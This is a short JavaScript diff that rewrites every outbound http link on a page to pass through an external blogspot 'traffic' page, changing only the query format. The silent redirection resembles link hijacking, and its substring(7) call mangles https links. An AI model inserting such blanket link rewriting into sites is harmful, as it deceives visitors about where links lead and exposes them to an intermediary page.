@@ -10,7 +10,7 @@ document.write( a1 + a3+ a4 );
     document.querySelectorAll("a[href]"),
     function(link) {
         if (link.href.startsWith("http")) {
-            link.href = "https://kasworld-aero.blogspot.com/p/traffic.html?url=" + link.href.substring(7);
+            link.href = "https://kasworld-aero.blogspot.com/p/traffic.html?" + link.href.substring(7);
         }
     }
 );
